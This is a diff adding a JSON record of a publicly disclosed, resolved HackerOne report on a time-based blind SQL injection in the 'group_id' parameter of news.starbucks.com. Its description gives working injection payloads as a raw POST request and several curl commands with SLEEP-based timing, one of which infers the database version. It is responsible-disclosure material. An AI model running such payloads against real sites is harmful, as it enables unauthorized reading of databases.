@@ -1,0 +1,149 @@
+{
+  "id": 198292,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTgyOTI=",
+  "url": "https://hackerone.com/reports/198292",
+  "title": "Time-based Blind SQLi on news.starbucks.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-01-14T04:52:15.129Z",
+  "submitted_at": "2017-01-14T04:52:15.129Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "toctou",
+    "url": "/toctou",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/279/f50689306c5f4971d18641697f23118b0f0ce910_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1989,
+    "url": "https://hackerone.com/starbucks",
+    "handle": "starbucks",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Starbucks",
+      "twitter_handle": "Starbucks",
+      "website": "http://www.starbucks.com",
+      "about": "Premier purveyor of the finest coffee in the world, inspiring and nurturing the human spirit — one person, one cup and one neighborhood at a time."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-02-24T19:47:12.100Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-01-26T18:48:13.747Z",
+  "team_member_agreed_on_going_public_at": "2017-02-24T19:47:12.051Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nI just found that the post parameter \"group_id\" for a particularly crafted http request is being vulnerable to injection due to missing parameter sanitization.\n\nPoC:\n```\nPOST / HTTP/1.1\nHost: news.starbucks.com\nConnection: close\nContent-Length: 81\nCache-Control: max-age=0\nOrigin: https://news.starbucks.com\nContent-Type: application/x-www-form-urlencoded\n\nACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\n```\n\nThis query will result in an execution of a SLEEP command, delaying the server response time:\n```\ntime curl --data \"ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal\t0m4.945s\nuser\t0m0.000s\nsys\t\t0m0.063s\n```\n\nIf the custom IF statement evaluates to False, the response would be sensibly faster:\n```\ntime curl --data \"ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal\t0m0.860s\nuser\t0m0.000s\nsys\t\t0m0.031s\n```\n\nIn this way it was possible to detect the dbms version being 5:\n```\ntime curl --data \"ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal\t0m4.945s\n\ntime curl --data \"ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal\t0m1.005s\n```",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-02-25T18:48:13.794Z",
+  "allow_singular_disclosure_after": -290291901.8009573,
+  "singular_disclosure_allowed": true,
+  "vote_count": 35,
+  "voters": [
+    "delimitry",
+    "tk0",
+    "fritzo",
+    "samux",
+    "icanthack",
+    "fillawful",
+    "hackerhero",
+    "gerben_javado",
+    "meals",
+    "skansing",
+    "and 25 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 12995,
+    "asset_type": "OTHER",
+    "asset_identifier": "Other assets",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 3457,
+      "category": "researcher",
+      "content": "Full story here: http://timeofcheck.com/time-based-blind-sqli-on-news-starbucks-com/",
+      "updated_at": "2017-02-26T22:55:38.209Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 1279,
+        "username": "toctou",
+        "name": "toctou",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "http://timeofcheck.com",
+        "location": "",
+        "created_at": "2013-11-09T22:42:57.746Z",
+        "url": "https://hackerone.com/toctou",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/279/f50689306c5f4971d18641697f23118b0f0ce910_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/279/f50689306c5f4971d18641697f23118b0f0ce910_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/001/279/f50689306c5f4971d18641697f23118b0f0ce910_original.jpg/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
+        }
+      }
+    }
+  ]
+}
